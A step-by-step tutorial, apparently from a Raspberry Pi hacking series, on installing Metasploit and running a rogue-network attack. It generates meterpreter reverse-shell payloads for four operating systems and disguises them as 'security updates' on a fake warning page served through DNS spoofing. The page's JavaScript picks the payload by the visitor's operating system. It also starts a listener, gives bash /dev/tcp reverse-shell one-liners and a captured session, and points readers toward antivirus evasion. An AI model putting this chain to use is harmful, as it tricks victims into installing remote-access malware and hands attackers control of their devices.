# Metasploit on Raspberry PI

With Metasploit, you have many attack possibilities, in this tutorial I will just show one of many. You can use this as a starting point and expand it further.

## Objective

The aim of this tutorial is to install Metasploit on Raspberry PI and to provide a tiny download (_TCP reverse shell_) on spoofed DNS web page.

## Precondition

You should already have read (_and successful carried out_) the following tutorials.

- [Setup Raspberry PI](../Setup)
- [Prepare Raspberry PI](../Preparation)
- [Wi-Fi Analysis](../WIFIAnalysis)
- [Simple Access Point](../AccessPoint)
- [STA Enumeration](../STAEnumeration)
- [DNS Analysis](../DNSAnalysis)
- [HTTP Analysis](../HTTPAnalysis)
- [HTTPS Analysis](../HTTPSAnalysis)
- [DNS Redirection](../DNSRedirection)

## Install needed and/or optional packages

Install (_or ensure they are installed_) following packages.

```shell
# update system (optional)
$ sudo apt update -y && sudo apt upgrade -y

# install optional packages (optional)
$ sudo apt install -y vim tree

# install needed packages
$ sudo apt install -y curl nmap
```

## Preparation

For the Metasploit (_first steps_) section, and the Metaslpoit/Msfvenom (_final attack_) sections, you can create already some folders.

```shell
# create some directories
$ mkdir /var/www/html/{images,styles,scripts,data}
```

## Metasploit

### Install Metasploit

```shell
# download latest install script
$ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall

# change file permissions
$ chmod u+x msfinstall

# start installation
$ sudo ./msfinstall
```

### Start Metasploit

```shell
# start msfconsole
$ msfconsole
```

Start the initial msfconsole, this will also set up your database.

```
Would you like to use and setup a new database (recommended)? y
Initial MSF web service account username? [pi]:
Initial MSF web service account password? (Leave blank for random password):
```

Please store these credentials!!!

## First steps with Metasploit

This section should show you the first steps with Metasploit, in case this awesome tool is new to you.

```shell
# add workspace (and switch)
msf6 > workspace -a first-steps

# executes nmap scan
msf6 > db_nmap 192.168.0.1/24

# list all hosts in the database
msf6 > hosts

# list all services in the database
msf6 > services

# exit msf console
msf6 > exit

# search for available http auxiliaries (optional)
msf6 > search auxiliary name:http

# enable directory scanner
msf6 > use auxiliary/scanner/http/dir_scanner

# show options
msf6 auxiliary(scanner/http/dir_scanner) > options

# set RHOST value
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 192.168.0.1

# run scanner
msf6 auxiliary(scanner/http/dir_scanner) > run
...
[+] Found http://192.168.0.1:80/data/ 404 (192.168.0.1)
[+] Found http://192.168.0.1:80/images/ 404 (192.168.0.1)
[+] Found http://192.168.0.1:80/styles/ 404 (192.168.0.1)
...

# exit msfconsole
msf6 auxiliary(scanner/http/dir_scanner) > quit
```

## The final attack with Metasploit and Msfvenom

### Generate some exploits

Okay, let's make the hands dirty.

```shell
# start msfconsole (without banner)
$ msfconsole -L

# search for reverse tcp
msf6 > search meterpreter_reverse_tcp

# create payload for Windows
msf6 > msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe > /var/www/html/data/security.exe

# create payload for Linux
msf6 > msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > /var/www/html/data/security.elf

# create payload for macOS
msf6 > msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f macho > /var/www/html/data/security.dmg

# create payload for Android
msf6 > msfvenom -p android/meterpreter_reverse_tcp -o /var/www/html/data/security.apk LHOST=192.168.0.1 LPORT=4444

# show directory structure (optional)
msf6 > tree /var/www/html/data/
├── security.apk
├── security.dmg
├── security.elf
└── security.exe
```

### Prepare the spoofed domain page

Content of file `/var/www/html/index.html`.

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Security Warning - with security update</title>
  <link type="text/css" rel="stylesheet" href="styles/style.css">
</head>
<body>
  <div id="warning">
    <h1>Security Warning</h1>
    <p>We have detected a serious security problem,<br /> 
       please install now the free security update!</p>
  </div>
  <div id="patch">
    <span><!-- placeholder security update --></span>
  </div>
  <script type="text/javascript" src="scripts/script.js"></script>
</body>
</html>
```

Content of file `/var/www/html/styles/style.css`.

```css
@charset "UTF-8";

html, body {
  font-family: Arial, Helvetica, sans-serif;
  text-align: center;
}

h1, p {
  margin: 0;
  padding: 0;
}

h1 {color: red;}

p {
  margin-top: 5px;
  color: black;
}

a {text-decoration: underline;}

a:hover {text-decoration: none;}

#warning, #patch {
  margin: 20px auto 0 auto;
  padding: 0;
  width: 400px;
}
```

Content of file `/var/www/html/scripts/script.js`.

```javascript
'use strict';

if (navigator.userAgent.match(/Linux/i)) {
  document.getElementById("patch").innerHTML = "<a href=\"data/security.elf\" target=\"_blank\">Linux Security Update</a>";
} else if (navigator.userAgent.match(/Windows/i)) {
  document.getElementById("patch").innerHTML = "<a href=\"data/security.exe\" target=\"_blank\">Windows Security Update</a>";
} else if (navigator.userAgent.match(/Mac/i)) {
  document.getElementById("patch").innerHTML = "<a href=\"data/security.dmg\" target=\"_blank\">macOS Security Update</a>";
} else if (navigator.userAgent.match(/android/i)) {
  document.getElementById("patch").innerHTML = "<a href=\"data/security.apk\" target=\"_blank\">Android Security Update</a>";
} else {
  document.getElementById("patch").innerHTML = "Your system is not supported..."
}
```

### Start connection handler

```shell
# use multi/handler
msf6 > use exploit/multi/handler

# show information's (optional)
msf6 exploit(multi/handler) > info

# show options (optional)
msf6 exploit(multi/handler) > options

# set LHOST
msf6 exploit(multi/handler) > set LHOST 192.168.0.1

# start multi/handler
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.0.1:4444
```

### Wait or test for connection

You can now wait or just test it yourself (_without a payload, of course_).

With a 2nd terminal session, you can check the port 4444 on Raspberry PI.

```shell
# show if port 4444 is listen
pi@raspberrypi:~ $ ss -tl | grep 4444
LISTEN   0        256          192.168.0.1:4444                  0.0.0.0:* 
```

On other own device(s) you can establish a reverse shell.

```shell
# if SHELL is Bash
┌──[lupin@centos]::[~]
└─ % /bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1

# if SHELL is ZSH
┌──[lupin@macOS]::[~]
└─ % /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1"
```

Yes, 2 sessions were opened ... 

```shell
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.0.1:4444
[*] Command shell session 2 opened (192.168.0.1:4444 -> 192.168.0.140:54247) at 2021-04-04 17:54:08 +0100
ifconfig en0
en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	...
	inet 192.168.0.140 netmask 0xffffff00 broadcast 192.168.0.255
	...
bash-3.2$ exit
```

## Additional

To bypass common antivirus products, you should have a look at evasion techniques!!!! [Here](https://www.rapid7.com/globalassets/_pdfs/whitepaperguide/rapid7-whitepaper-metasploit-framework-encapsulating-av-techniques.pdf) you can read a document provided by Rapid7.

[Go Back](../readme.md)
